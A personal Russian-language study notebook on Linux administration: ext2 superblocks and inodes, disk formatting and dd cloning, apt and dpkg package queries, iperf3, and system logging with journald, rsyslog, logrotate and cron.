# e2fsck -b 819200 /dev/sda1
В данном случае в блоке 819200 хранится резервная копия суперблока. После применения команды пробуем снова монтировать файловую систему. Либо как вариант использовать ключ sb команды mount, который указывает на расположение копии суперблока

# mount -o -sb=819200 /dev/sda1 /mnt
В данном случае считываем копию суперблока из блока 819200
===== end of "Суперблок в линуксе"

https://studbooks.net/2139570/informatika/fizicheskaya_organizatsiya_faylovyh_sistem_ext2_ext3_ext4
Как и в любой файловой системе UNIX, в составе ext2 можно выделить следующие составляющие:
- блоки и группы блоков (РАНЕЕ носили НАЗВАНИЕ Cylinder Group группы цилиндров);
- индексный дескриптор (inode);
- суперблок.

"Цилиндр" в настощее время носит название "группа блоков"/Blocks Group -  создавался 1)как единица повышения надежности тома, аналогична «клетке» FS, при  ее разрушени погибнут только  файлы на ней
2) для оптимизации операций  скорости записи и чтения на HDD в связи с локализацией магнит головки HDD 
block groups Отражаются при (см выше!)
sudo mke2fs -t ext2 -b 1024 -L Dsk2 -v /dev/sdb3
tune2fs -l
dumpe2fs

Индексные дескрипторы  - внутренняя системная запись файлов,inodes (англ. information node). Это специальная структура, которая содержит информацию об атрибутах и физическом расположении файла (ссылках на номера блоков, содержащих фрагметы файла). Индексные дескрипторы объединены в таблицу, которая содержится в начале каждой Группы Блоков.
Суперблок - основной элемент файловой системы ext2. Он содержит общую информацию о файловой системе:
- общее число блоков и индексных дескрипторов в файловой системе,
- число свободных блоков и индексных дескрипторов в файловой системе,
- размер блока файловой системы,
- количество блоков и индексных дескрипторов в группе блоков,
- размер индексного дескриптора,
- идентификатор файловой системы.
Суперблок находится в 1024 байтах от начала раздела. От целостности суперблока напрямую зависит работоспособность файловой системы. Операционная система создаёт несколько резервных копий суперблока на случай повреждения раздела - В НАЧАЛЕ некооторых ГруппБлоков/ГруппЦилитров. В следующем блоке после суперблока располагается глобальная дескрипторная таблица - описание групп блоков, представляющее собой массив, содержащий общую информацию обо всех группах блоков раздела.

Файловая система Суперблок https://docstore.mik.ua/manuals/ru/sag/x1038.html
Файловая система это методы и структуры данных, которые используются операционной системой для хранения файлов на диске или его разделе. О файловой системе также говорят, ссылаясь на раздел или диск, используемый для хранения файлов или тип файловой системы.
Нужно видеть разницу между диском или разделом и установленной на нем файловой системой. Некоторые программы (например, программы установки файловой системы) при обращении к диску или разделу используют прямой доступ к секторам.
Если на этом месте была файловая система, то она будет серьезно повреждена. Большинство программ взаимодействуют с диском посредством !файловой системы!, и, следовательно, их работа будет нарушена, если на разделе или диске никакая система не установлена (или тип файловой системы не соответствует требуемуму). Перед тем, как раздел или диск могут быть использованы в качестве файловой системы, она должна быть инициализирована, а требуемые данные перенесены на этот диск. Этот процесс называется СОЗДАНИЕ файловой системы. У большей части файловых систем UNIX сходная структура, а их некоторые особенности очень мало различаются. Основными понятиями являются:
   Суперблок (superblock)     Индексный дескриптор (inode)  Блок данных (data block)
   Блок каталога (directory block) Косвенный блок (indirection block). 

   Суперблок содержит информацию о Файловой Системе в целом, например, ее размер (точная информация зависит от типа файловой системы).
   Индексный дескриптор хранит всю информацию о ФАЙЛЕ, кроме его имени!! 
Имя файла хранится в Блоке каталога, вместе с номером Индексного дескриптора.
  Запись каталога содержит имя файла и номер индексного дескриптора соответствующего файла.
  В этом Индексном дескрипторе хранятся номера нескольких блоков данных, которые используются для хранения самого файла. В inode есть место только для нескольких номеров блоков данных, однако, если требуется большее количество, то пространство для указателей на блоки данных динамически выделяется. Такие блоки называются Косвенными.
 Для того, чтобы найти блок данных, нужно сначала найти его номер в косвенном блоке. 
 
В файловых системах UNIX обычно имеется возможность создания дыр (hole)в файлах (это можно сделать с помощью команды lseek, см. man-руководство). Это означает, что файловая система предоставляет ложную информацию о том, что в каком-то месте в файле содержатся нулевые байты, но в действительности для этого не выделяются сектора (это означает, что файл будет занимать несколько меньше места на диске). Это часто используется особенно в небольших двоичных программах, библиотеках Linux, в некоторых базах данных и в других отдельных случаях. Дыры реализуются хранением специального значения в косвенном блоке или индексном дескрипторе вместо адреса блока данных. Это специальное значение показывает, что для данной части файла блоки данных не размещены и, следовательно, что в файле есть дыра. Таким образом, довольно примитивное сжатие данных в Linux реализовано непосредственно на уровне файловой системы.

ПОЧЕМУ ВАЖНО РАЗМОНТИРОВАТЬ УСТРОЙСТВА
free показываtn статистику использования памяти, можно увидеть статистику с названием buffers (буферы). Размонтирование устройства влечет за собой запись всех оставшихся данных в это устройство, чтобы его можно было безопасно извлечь. Если носитель извлечь, не выполнив размонтирование, есть вероятность, что не все данные, предназначенные для устройства, будут записаны в него. Иногда эти данные могут включать жизненно важные обновления каталогов, отсутствие которых может привести к повреждению файловой системы — одной из самых больших неприятностей, которые могут случиться с компьютером

/dev/hd* Диски IDE (PATA) в старых системах. Обычно материнские платы содержат два разъема, или канала IDE, к каждому из которых можно подключить шлейф, рассчитанный на два устройства. Первое устройство, подключенное к такому шлейфу, называется ведущим устройством (master device), а второе — подчиненным устройством (slave device). Имена устройств упорядочены так, что ведущее устройство, подключенное к первому каналу, получает имя /dev/hda, а ведомое устройство, подключенное к первому каналу, получает имя /dev/hdb; 
ведущее устройство, подключенное ко второму каналу, получает имя /dev/hdc, и т. д. Цифра в конце определяет номер раздела на устройстве. Например, имя /dev/hda1 соответствует первому разделу на первом жестком диске в системе, тогда как имя /dev/hda соответствует всему устройству в целом
/dev/sd* Диски SCSI. В последних версиях системы Linux ядро интерпретирует все дисковые устройства (включая жесткие диски PATA/SATA, флеш-диски и съемные 
накопители USB, такие как портативные музыкальные плееры и цифровые камеры) как диски SCSI!!. В остальном система именования напоминает прежнюю систему /dev/hd*, описанную выше

 = =  Как размонтировать диск https://zalinux.ru/?p=4904 = = 
Для размонтирования диска используется любая из двух команд:
sudo umount /dev/имя_раздела   Или:  sudo umount /точка/монтирования/
Частой ошибкой является когда указывают с командой umount одновременно имя диска и точку монтирования — нужно указать только что-то одно.

---------------------- Разметка разделов и форматиирование дисков ----------------------------
https://losst.pro/formatirovanie-fleshki-v-linux#%D0%A4%D0%BE%D1%80%D0%BC%D0%B0%D1%82%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D0%B5_%D1%84%D0%BB%D0%B5%D1%88%D0%BA%D0%B8_%D0%B2_Linux_%D1%81_%D0%BF%D0%BE%D0%BC%D0%BE%D1%89%D1%8C%D1%8E_%D1%82%D0%B5%D1%80%D0%BC%D0%B8%D0%BD%D0%B0%D0%BB%D0%B0 форматирование флешки в GUI  bash linux
программа форматаирования и создания разделов GUI Gparted

fdisk работает столько с MBR, не поддерживает GPT !!!
sudo fdisk /dev/sdb  // создание изменение разделов и МЕТОК диcка на флэш диска, аналог fdisk msdos
sudo mkfs -t vfat -v /dev/sdc1 // ФОРМАТИРОВАНИЕ разделов на флэш диске, аналог format msdos -t vfat // 27.01.2023 -форматирование fat32         
 !!! только с такими параметрами удается отформатировать флешку в минт чтобы она была
  записываемая и читалась в т.ч. в windows (не имеет встроенных драйверов ext)

sudo mke2fs -t ext2 -b 1024 -L Dsk2 -v /dev/sdb3 // ФОРМАТИРОВАНИЕ разделов на флэш диске в ext2, альтернатива программе mkfs
fs_types for mke2fs.conf resolution: 'ext2', 'small'
Filesystem label=Dsk2
OS type: Linux
Block size=1024 (log=0)
Fragment size=1024 (log=0)
Stride=0 blocks, Stripe width=0 blocks
82328 inodes, 329728 blocks
16486 blocks (5.00%) reserved for the super user
Первый блок данных=1
Maximum filesystem blocks=67633152
41 block groups // = Цилиндров Cylinders
8192 blocks per group, 8192 fragments per group
2008 inod'ов в группе
Filesystem UUID: 41fdfa7f-9c5d-4c4f-bdc5-e3ac70a8d7c1
Superblock backups stored on blocks:
        8193, 24577, 40961, 57345, 73729, 204801, 221185
Allocating group tables: done
Сохранение таблицы inod'ов: done
Writing superblocks and filesystem accounting information: готово

Кетов/Ketov: "5%  reserved for the super user" - специально выделяемое количество блоков диска/раздела для возможности корректной работы 1)Cлужб ОС, работающих от имени администратора/root (запись в системые журналы, syslog...) и 2)пользователя с правами root во время восстановления диска/ОС в аварийном режиме, после того как остальные пользователи подлностью заполнили диск/раздел. При форматировании раздела можно отменить данное резервирование, если раздел не корневой(Я) 

------------ Клонирование дисков ------------------
dd if=/dev/sdb of=/dev/sdc клонирование дисков- с полной заменой   файловой системы клонируемого д-ка клинируемым диском
dd if=/dev/sdb of=flash_drive.img  клонирование/запись образ диска в файл 

 ============== ПАКЕТЫ LINUX ИЗМЕНЕНИЕ ПРЕОРИТЕТА РЕПОЗИТОРИЕВ  ================
НА Debian!!! apt не хотели инсталлироваться программы из инетрнет репозиториев, а на диске не было. 
Пришлось переставить в  /etc/apt/sources.list  источник   deb cdrom на последнее место
mvn@mmdeb:~$ cat /etc/apt/sources.list
  deb http://deb.debian.org/debian/ bookworm main
  deb-src http://deb.debian.org/debian/ bookworm main
  deb cdrom:[Debian GNU/Linux bookworm-DI-alpha2 _Bookworm_ - Official Alpha amd64 DVD Binary-1 with firmware 20230218-23:57]/ bookworm main non-free-firmware 
На Mint этот файл: 
cat /etc/apt/sources.list.d/official-package-repositories.list
# Do not edit this file manually, use Software Sources instead.
deb http://packages.linuxmint.com vera main upstream import backport #id:linuxmint_main
deb http://archive.ubuntu.com/ubuntu jammy main restricted universe multiverse
....


Файлы пакетов
Основной единицей программного обеспечения в системе пакетов является файл пакета.
Файл пакета—это сжатая коллекция файлов, составляющих программный пакет.
Пакет может состоять из множества программ и файлов с данными, поддерживающих программы.
Помимо файлов для установки, файл пакета включает также метаданные с информацией о пакете,
например текстовым описанием пакета и его содержимого. 
Ответственный за пакет получает программное обеспечение в исходном коде от поставщика
(автора программы), компилирует его и создает метаданные для пакета вместе со всеми
необходимыми сценариями установки.
 
Репозитории
Некоторые проекты самостоятельно создают пакеты и дистрибутивы своего программного
 обеспечения, и все же большинство пакетов в наше время собирается создателями дистрибутивов
 и заинтересованными третьими сторонами. Готовые пакеты помещаются в центральный репозиторий
 дистрибутива, где они становятся доступными для пользователей. Репозиторий может содержать 
тысячи пакетов, специально собранных для дистрибутива.
Для дистрибутива может поддерживаться несколько разных репозиториев для программного
обеспечения, находящегося на разных этапах разработки. Например, дистрибутивы обычно
 имеют тестовый репозиторий, содержащий недавно созданные пакеты, которые предназначены 
для смельчаков, пытающихся отыскать ошибки до того, как пакеты попадут в основной дистрибутив.
Нередко дистрибутивы имеют репозиторий для разработки, куда помещаются пакеты, продолжающие разрабатываться и предназначенные для включения в ближайший выпуск дистрибутива.
Дистрибутив может также иметь сторонние репозитории. Они необходимы для распространения программного обеспечения, которое по юридическим причинам, связанным с патентами или законами об управлении цифровыми правами (Digital Rights Management, DRM), не может быть включено в дистрибутив.  

Зависимости
Программы редко действуют в одиночку; чаще они полагаются на наличие других программных компонентов. Стандартные операции, такие как ввод/вывод, на-
пример, выполняются процедурами, которые совместно используются многими программами. Эти процедуры хранятся в так называемых разделяемых библиотеках (shared libraries), предоставляющих важные услуги нескольким программам.
Если пакету требуется некий общий ресурс, такой как разделяемая библиотека, про него говорят, что он имеет зависимость. 
см программу ldd name_progr/name_lib
Современные системы управления пакетами поддерживают некоторые методы разрешения зависимостей, — это гарантирует, что после установки пакета в системе будут также установлены все его зависимости.

Высоко- и низкоуровневые инструменты управления пакетами
Системы управления пакетами обычно включают инструменты двух типов: НИЗКОуровневыЕ 
инструменты, решающие такие задачи, как установка и удаление ФАЙЛОВ! пакетов, 
и ВЫСОКОуровневыЕ инструменты, выполняющие поиск в Метаданных и разрешение зависимостей.
В этой главемы посмотрим, какие инструменты входят в состав систем на основе
Дистрибутивы 		Низкоуровневые		Высокоуровневые 
На основе Debian(Ubuntu)   dpkg			 apt-get, aptitude
 

Что такое репозитории в Linux?  — источник: https://windowscomp.ru/linux/repozitorii-v-linux-kak-dobavit-i-ustanovit-v-linuks-mint.html?ysclid=ljvrnh683n923376909
Репозиторий — место для хранения и поддержки данных.
Существует 2 типа репозиториев: официальные и неофициальные.
Как правило, дистрибутив имеет несколько официальных репозиториев, 
в которых содержатся пакеты. Которые в свою очередь различаются по свойствам.
В Ubuntu, например, есть официальные репозитории, такие как:
Main – основное абсолютно бесплатное программное обеспечение;
Restricted – несвободное программное обеспечение;
Universe – бесплатное программное обеспечение;
Multiverse – несвободное программное обеспечение.
Причем, все 3 типа, кроме Multiverse, официально поддерживаются дистрибутивом, а Universe поддерживается сообществом дистрибутива.

При необходимости, если вы не нашли нужную программы в официальном репозитории,
то можете воспользоваться дополнительным, и найти программу там.

Например, в Ubuntu дополнительными служат PPA-репозитории.
PPA (Personal Package Archive) – это персональное место хранения разработчика, в котором
собраны пакеты их программ, которые еще не добавлены в основной.
===  apt  ==== 
https://interface31.ru/tech_it/2019/09/linux-nachinayushhim-chast-5-upravlenie-paketami.html
https://losst.pro/apt-vs-apt-get-v-chem-raznitsa "apt-get - устаревший инструмент и практичность его сомнительна. Инструмент apt был разработан с нуля, чтобы быть еще эффективнее"
https://losst.pro/kak-dobavit-repozitorij-linux-mint
apt source iperf3 // выполнить загрузку ИСХОДНОГО КОДА программ из репозитариев
 //Я: 09-07-2023 Чтобы выполнять загрузку исходного кода программ 'apt source имя_пакета'
 //в GIU в программе mintsources включить выключатель "Репозитории исходного кода"

apt show  docker.io //!!!  показать инфо, в т.ч. размер пакета !!!!!
Package: docker.io
Version: 24.0.5-0ubuntu1~22.04.1
Installed-Size: 113 MB

apt search iperf // поиск пакетов в !репозитриях! в отличии от  "apt-cache search"
p   iperf   - инструмент измерения скорости передачи по межсетевому протокол
p   iperf3   - инструмент измерения скорости передачи по межсетевому протокол
p   libiperf-dev    - Internet Protocol bandwidth measuring tool (development files)
p   libiperf0    - Internet Protocol bandwidth measuring tool (runtime files)

Если вы в своих экспериментах удалили или еще как-либо повредили входящие в состав пакета файлы, но система считает, что пакет установлен и отказывается устанавливать его повторно. Но можно всегда переустановить пакет:
apt --reinstall install имя_пакета
Еще одна важная возможность APT - это восстановление нарушенных зависимостей и автоматическое исправление ошибок при установке пакетов, например, когда процесс обновления или установки был аварийно прерван. Либо когда вы установили некоторый пакет при помощи dpkg и при этом у него оказались неудовлетворенные зависимости. Все это в большинстве случаев отлично исправляется одной простой командой:
apt install -f
apt moo // пасхалка с коровой
apt list // список всех установленных пакетов linux в ОС!!
apt show iperf3 // информация о пакете
apt purge .. // уздалить все файлы пакета, включая конфгурационны файлы !!

 = = = apt-cache  = = =
apt-cache  // apt-cache ищет и отображает имеющуюся информацию об установленных и доступных
для установки пакетах. Она работает исключительно! с данными ЛОКАЛЬНОГО КЭША,
созданного командой «update», например, программы apt-get. Вследствие этого
отображаемая информация может являться устаревшей, если обновление долго не
выполнялось, но зато apt-cache работает независимо от доступности настроенных
источников (например, без доступа к сети).
Основные команды:
  showsrc - показать информацию о пакете с исходным кодом
  search - найти пакеты, имя которых удовлетворяет регулярному выражению
  depends - показать необработанную информацию о зависимостях пакета
  rdepends - показать информацию об обратных зависимостях пакета
  show - показать информацию о пакете в удобочитаемой форме
  pkgnames - показать имена всех пакетов в системе
  policy - показать текущую политику выбора пакетов

apt-cache search ldap | grep ldap | grep krb  !!!

apt-cache search iperf3
iperf3 - инструмент измерения скорости передачи по межсетевому протоколу
libiperf-dev - Internet Protocol bandwidth measuring tool (development files)apt-cache show htop//  определить, был ли установлен пакет htop в системе, посм-ть ОПИСАНИЕ и "ЗАВИСИМОСТИ"
apt-get update; apt-get upgrade // команда применит все обновления, доступные для пакетов, установленных в системе на основе Debian:
apt-get source iperf3 !!!!!!!!!

apt install  fortunes-ru // афоризмы и поговорки на русском

  = = =  dpkg  установка и удаление ФАЙЛОВ! пакетов, поиск информации в ФАЙЛАХ пакетов = = = =
Найти Какому пакету принадлежит файл в Linux
https://losst.pro/uznaem-kakomu-paketu-prinadlezhit-fajl-v-ubuntu?ysclid=lky64ilxi3625202560
1) dpkg -S file //Найти к какому пакету принадлежит файл
 dpkg -S `which dig`                        // Search for a filename from installed packages.
 bind9-dnsutils: /usr/bin/dig // имя пакета "coreutils" 

dpkg -S /usr/share/man/man1/sort.1.gz // найти пакет откуда sort.1.gz
coreutils: /usr/share/man/man1/sort.1.gz // имя пакета "coreutils" 

2) Второй вариант, объединение 2х команд
 dpkg -S `which dig` | awk -F: '{print $1}' | xargs dpkg -s
Package: bind9-dnsutils
3) нестандартная программа (требует установки) apt-file search /usr/bin/ncdu

dpkg --search (аналог -S) htop // найти файлы htop, если они были установлены ранее в пакете
dpkg --status (аналог -s) htop//  определить, был ли установлен пакет htop в системе, посм-ть ОПИСАНИЕ и "ЗАВИСИМОСТИ"
dpkg-query -W procps
   procps  2:3.3.17-6ubuntu2

Команда dpkg (=dpkg-query)
dpkg -S /usr/bin/top //найти пакет, из которого установились на диске top
   procps: /usr/bin/top
dpkg -S /etc/skel  найти пакет, из которого установились на диске каталоги  /etc/skel...
    mint-artwork, bash, base-files: /etc/ske// найти пакет, из которого установились на диске каталоги 

dpkg -S nmap | grep /man/

dpkg -S login.defs //найти пакет в котром есть файл login.defs
  login: /usr/share/man/zh_CN/man5/login.defs.5.gz
  login: /usr/share/man/it/man5/login.defs.5.gz
  login: /usr/share/man/de/man5/login.defs.5.gz
  login: /etc/login.defs

dpkg -l 'lsscsi' //  Список известных пакетов соотв-щих одному или более критериям поиска
||/ Имя            Версия       Архитектура  Описание
+++-==============-============-============-====================================================
ii  lsscsi         0.31-1build2 amd64        list all SCSI devices (or hosts) currently on system

dpkg -L procps // список(List Files)файлов,входящих/установленных из пакета
/bin/kill
/bin/ps
/etc/init.d
/etc/init.d/procps
/etc/sysctl.conf
/usr/bin/free
/usr/bin/tload
/usr/bin/top
....

dpkg -L nmap | grep /man/ // файлов справок man входящих в пакет nmap
/usr/share/man/de/man1/nmap.1.gz
/usr/share/man/es/man1/nmap.1.gz
/usr/share/man/fr/man1/n
...

dpkg -L samba | grep /etc/ // список конфигурационных файлов,   входящих в пакет samba
/etc/apparmor.d/samba
/etc/cron.daily/samba
/etc/init.d/nmbd
...

dpkg -s procps // инфомация  о Cтатусе пакета procps 
Package: procps
Status: install ok installed
Priority: required
Section: admin
..
Description: /proc file system utilities
 This package provides command line and full screen utilities for browsing
 procfs, a "pseudo" file system dynamically generated by the kernel to
 provide information about the status of entries in its process table
 (such as whether the process is running, stopped, or a "zombie").
 .
 It contains free, kill, pkill, pgrep, pmap, ps, pwdx, skill, slabtop,
 snice, sysctl, tload, top, uptime, vmstat, w, and watch.

pwdx - report current working directory of a process

dpkg -S (-S=--search) iperf3 // просмотр установленн файлов пакета iperf3
iperf3: /usr/share/man/man1/iperf3.1.gz
iperf3: /usr/bin/iperf3
iperf3: /usr/share/doc/iperf3/README.md.gz
iperf3: /usr/share/doc/iperf3/copyright
iperf3: /usr/share/doc/iperf3/changelog.Debian.gz
bash-completion: /usr/share/bash-completion/completions/iperf3

Алгоритм поиска пакета по имени программы
1) Например имя программы/файла viewres
  dpkg -S viewres // ищем пакет к которому этот файл относится 
 x11-utils: /usr/bin/viewres // - ответ - пакет x11-utils
2) dpkg -s x11-utils // запрашиваем статус пакета


 = = = = = = IPERF = = = = =  
iperf3: /usr/share/doc/iperf3
$iperf3 -s -p 9999 -D // iperf3 как служба Дэмон
mint@mint:~$ ps -aux | grep iperf
  mint        8350  0.0  0.0   8272   508 ?        Ss   17:23   0:00 iperf3 -s -p 9999 -D
  mint        8352  0.0  0.1   9604  2044 pts/0    S+   17:23   0:00 grep --color=auto iperf
iperf3 // остановить службу
iperf3 -c 194.158.199.146 -p 9999 -O -u -b 5M -l 1K -R 



  = = УСТАНОВКА РАСПРОСТРАНИЕ ДРАЙВЕРОВ УСТРОЙСТВ = =
распространяются почти так же, только они не выделяются в отдельные пакеты в репозитории
  дистрибутива, а включаются в ядро Linux. Можно сказать, 
что в Linux нет такого понятия, как «диск с драйверами». Либо ядро поддерживает данное устройство,
 либо нет, а ядро Linux поддерживает огромное число устройств. 


 = = =  Системные ЖУРНАЛЫ /LOGS/ЛОГИ ПЛАНИРОВЩИК logrotate = = = =
https://www.youtube.com/watch?v=iVf7clPG9fE&t=577s
36. Логирование — Основы GNU_Linux и подготовка к RHCSA.mhtml
Службы/демоны посылают сообщения в stdout,stderr, а также в спец файл-сокет /dev/log
ls -l /dev/log  /run/systemd/journal/dev-log
lrwxrwxrwx 1 root root 28 ноя  1 22:54 /dev/log -> /run/systemd/journal/dev-log
434 srw-rw-rw- 1 root root 0 ноя  1 22:54 /run/systemd/journal/dev-log
Сокеты служат для межпроцесного обмена. 
Сокет dev-log принадлежит процессу journald (часть systemd, eго сервис systemd-journald.service), 
поэтому все сообщения от служб/демонов,направляемых в dev/log , попадают в
/lib/systemd/systemd-journald. systemd-journald также перехватывает сообщения от сервисов, 
направленных в stdout,stderr.
До эпохи systemd демоном syslog был rsyslog, ему принадлежал сокет /dev/log.
Сейчас rsyslog также работает наряду systemd-journald и получают сообщения от него
Демон rsyslog, при получении логов, смотрит параметры лога и на основе этого записывает 
 их в различные файлы в директории /var/log: ls /var/log. Почти все логи rsyslog записывает
  в файл /var/log/messages.!!!!

В systemd  сообщения от демонов и процессов собирает демон  systemd-journald и затем делиться 
 с rsyslog (rsyslog.service), службой , которую постепенно замещает  systemd-journald.
- rsyslog.service записывает полученные  сообщения текстовые  файлы  в /var/log/ (/var/log/syslog и др.
 Какой файл - зависит от настройки служб,(У БОЛЬШИНСТВА ДЕМОНОВ - СВОИ LOG-ФАЙЛЫ),  и conf файлы rsyslog),
 а также может отправлять по сети сообщения по протоколу  syslog
-  systemd-journald сохраняет сообщения в двоичных файлах , удобных для дальнейшей обработку в БД, по сети может передать сообщение только еще одному сервису с  systemd-journald, а не любому syslog-serverу.
rsyslog - пишет в текстовые файлы и может отправлять сообщ на удаленный сервер, посылать по почте...
rsyslog пишет логи в файлы /var/log/, какой файл - зависит от настройки служб и  conf файлы rsyslog 
systemd-journald пишет в нетекстовые файлы, оптимизирован для сохранения в СУБД.
Настройки службы rsyslog:
less /etc/rsyslog.conf
less /etc/rsyslog.d/50-default.confult.conf
Настройка правил отправки сообщенйи: authpriv.*: authpriv - это логи
, связанные с безопасностью и аутентификацией; 
* - это логи любого уровня серьёзности - будут записываться в /var/log/secure. 
Или, например, первая строчка - *.info; mail.none; authpriv.none; cron.none - логи любых 
  бъектов уровня серьёзности info, кроме тех, что связанны с почтой, аутентификацией или 
 планировщиком задач cron - будут записываться в /var/log/messages.  
 Обратите внимание на дефис перед -/var/log/maillog - он говорит о том, чтобы не записывать
 на диск изменения при каждом новом логе (буфферизироватьв прамяти). Новые логи будут
  копиться какое-то время в оперативке, прежде чем разом записаться на диск.
  omusrmsg:  - Everyone logged on - отправка сообщений пользователям в консоль
Процесс синхронизации изменений в оперативке и с диском можно запустить 
  вручную с помощью команды sync!!

Файл настроки  systemd-journald /etc/systemd/journald.conf
Mode. При значении uid для каждого обычного пользователя создаётся отдельная база с его логами и автоматом выдаются нужные права, чтобы пользователь мог просматривать свои 
опция - SplitMode при значении uid для каждого обычного пользователя создаётся отдельная
 база с его логами и автоматом выдаются нужные права, чтобы пользователь мог просматривать свои 
SystemMaxUse задаёт ограничение на используемое логами пространство. 
По умолчанию это 10% от файловой системы, а если файловая система большая, то не более 4 Гигабайт.
Когда файл логов достигнет максимального значения, старые логи будут удаляться автоматически. SystemMaxFileSize позволяет по достижению какого-то объёма выносить старые логи в другую базу, которую вы можете потом перенести куда-нибудь в архивные логи. MaxRetentionSec - сколько времени хранить логи. Скажем, размер логов не достиг максимального значения, но при этом вам не нужны логи старее месяца


 ** logrotate  ** ‐ программа ротации сжатия и отправления по почте файлов журналов logs, 
  настройка через конфиг файл  /etc/logrotate.conf (определеет, что ротировать и сжимать). 
  опция weekly - по умолчанию logrotate будет ротировать логи раз в неделю. rotate 4 - ротаций
  будет 4. опция dateext - добавляет к старым логам дату их ротации.
  Периодический запуск logrotate выполянется через службу cron/anacron, см скрипт 
  с одноименным названием /etc/cron.daily/logrotate
  Для отдельных служб файлы настройки logrotate в нах-ся /etc/logrotate.d/

* * Просмотр системных журналов в реальном времени при добавлении записей realtime * *
journalctl -rn 50 # вывод последних 50 записей в хронологич порядке
sudo journalctl -ef # вывод последних записей и ОТСЛЕЖИВАТЬ НОВЫЕ (-f)
Что видим в логах? В первом столбце - дата и время лога, во втором - имя компьютера,
в третьем - программа, которая отправила этот лог, а также её pid, дальше само сообщение лога.
sudo journalctl -eu systemd-udevd //посмотреть логи по сервису. Причём невсе, а толькопоследние:
sudo journalctl -b //посмотреть логи запуска операционной системы:
logger -p news.alert "Hello World!"// записать тест сообщение,исп-ся в скриптах, для тестирования syslogсервера

"watch tail cmd" = "tail -f cmd"
watch tail /var/log/syslog //просмотр истемный журнал system log syslog ОС Linux (все сообщения, в  т.ч. при монтировании sdb1) 
watch tail /var/log/auth.log //
Nov  6 18:55:01 LnxPC CRON[3878]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
Nov  6 18:55:01 LnxPC CRON[3878]: pam_unix(cron:session): session closed for user root
Nov  6 18:55:36 LnxPC su: (to mvn) oem on pts/1
Nov  6 18:55:36 LnxPC su: pam_unix(su-l:session): session opened for user mvn(uid=30000) by (uid=29999)
Nov  6 18:56:40 LnxPC su: pam_unix(su-l:session): session closed for user mvn

sudo journalctl -f # запись в журнале после включения ufw на lnx1 (192.168.100.10) и блокирования tcp запросов на 
установление соединения по протоколу nfs с  lnx2 (192.168.100.12)
дек 27 00:32:14 LnxPC1 kernel: [UFW BLOCK] IN=enp0s3 OUT= MAC=08:00:27:30:1c:fd:08:00:27:99:5e:72:08:00
 SRC=192.168.100.12 DST=192.168.100.10 LEN=172 TOS=0x00 PREC=0x00 TTL=64 ID=56829 DF PROTO=TCP SPT=745 
 DPT=2049 WINDOW=501 RES=0x00 ACK PSH URGP=0 

** Кетов Администрирование Linux, часть 5.2.1_ Базовые службы_ syslog и cron.mp4 **
Служба /sbin/rsyslogd (выполянет функции сервера)
1)собирает через сокет /dev/log/ (/run/systemd/journal/dev-log /run/systemd/journal/syslog) события, отправляемые от клиентов:
// netstat -x | grep log
//unix  2      [ ]         DGRAM                    18838    /run/systemd/journal/syslog
1.1) службами/программами OC;
 1.2) сценариями через программу logger -p (!!!); 
  1.3) службами ядра через klogd (нет в ubuntu)
2) классиф-рует сообщения и записывает в файлы (собственно журналы log, терминалы, конкретный пользователю, 
   программа (со стандр потоколм stdin) или направляет информацию на удаленный log-сервер по TCP\IP 

Конфигурационный файл  /etc/rsyslog.conf (модульный, включает в себя др части, главная  /etc/rsyslog.d/50-default.conf )
Структура rsyslog.conf  см "man rsyslog.conf". 
Главная часть структуры - правило  Rules (selector + action)
    Каждая строка правила состоит из двух полей: поля выбора/selector и поля действия/action.
   Эти два поля разделены одним или несколькими пробелами или табуляцией.
  Поле селектора определяет шаблон объектов/facilitys  и приоритетов//prioritys, принадлежащих указанному действию.
  Поле селектора снова состоит из двух частей: объекта/facility и приоритета/priority, разделенных
  точкой («.»)  См ниже mail.err, kern.*                         /var/log/mail.err

 = = = Утилита logger записи в журналы  = = = =
logger -p authpriv.error "Test555" // отправить в журнал /var/log/auth.log (т.к. сообщение authpriv)
                  //запись  "Test555"
tail /var/log/auth.log
  Sep  2 20:00:04 LnxPC oem: Test555

logger -p daemon.err "Testdaemon.err" // записать  в журнал /var/log/syslog  "Testdaemon.err"
less /var/log/*log*
  /var/log/syslog:Sep  2 20:15:16 LnxPC oem: Testdaemon.err

logger -p mail.err "testmail" // записать в журналы /var/log/syslog и /var/log/mail.lo
grep testmail /var/log/*log*
/var/log/mail.log:Sep  2 20:20:41 LnxPC oem: testmail
/var/log/syslog:Sep  2 20:20:41 LnxPC oem: testmail


less /etc/rsyslog.d/*.conf // файлы конфигураций службы rsyslog.d
    //# Default logging rules can be found in /etc/rsyslog.d/50-default.conf
// Кетов видео web1: в файле /etc/syslog.conf или в ином похожем (разные для разных ОС), в случаей 
 Mint это ! /etc/rsyslog.d/50-default.conf, содержаться пути сохранения log для разных служб/программ
cat /etc/rsyslog.d/50-default.conf
auth,authpriv.*                 /var/log/auth.log
*.*;auth,authpriv.none          -/var/log/syslog
   # '-/' минус перед слеш означает, что запись в файл не сразу при каждом новом логе,а через опред время
   #обычно когда вы изменяете какой-то файл, изменения на файловой системе происходят в оперативке,
   #а потом синхронизируются с диском.Новые логи будут копиться в оперативке, прежде чем разом записаться
   #на диск. Кстати, процесс синхронизации изменений в оперативке и с диском можно запустить и 
   #вручную, с помощью команды sync. Это касается не только логов, но и любых изменений.

cron.*                         /var/log/cron.log
#daemon.*                       -
kern.*                          -/var/log/kern.log
#lpr.*                          -/var/log/lpr.log
mail.*                          -/var/log/mail.log
#user.*                         -/var/log/user.log
mail.*                          /dev/pts0 Я:не работает в mint
*.*				/tmp/loggg	
*.error				@192.168.100.100 // отправить на сервер
*.*				|/usr/bin/programma	// оправить в скрипт Кетов видео
kern.emerg 	                root // Я:не работает в mint


ls /var/log/* // файлы журналов логов системных служб ядра и демонов (сетевых служб)

 = = = cron = =  = (Кетов Администрирование Linux, часть 5.2.1_ Базовые службы_ syslog и cron.mp4)
Cron читает и выполняет задания из файлов 1) общесистемные таблицы  /etc/crontab, 
 2)Модульные таблицы 
 (/etc/cron.daily ... /etc/cron.monthly), входящие в /etc/crontab
3) Пользовательские таблицы /var/spool/cron/crontabs/. В 3) попадают таблицы пользователй после
 их создания и инсталлирования cron. КОму можно создавать пользовател. cron-таблицы определяется 
 ACL /etc/cron.allow (в ubuntu его нет)
https://losst.pro/nastrojka-cron:  +run-parts
 В современных дистрибутивах в /etc/crontab прописан запуск утилиты run-parts, которая 
 запускает нужные скрипты из следующих папок:
/etc/cron.hourly - каждый час;
/etc/cron.daily - каждый день;
/etc/cron.weekly - каждую неделю;
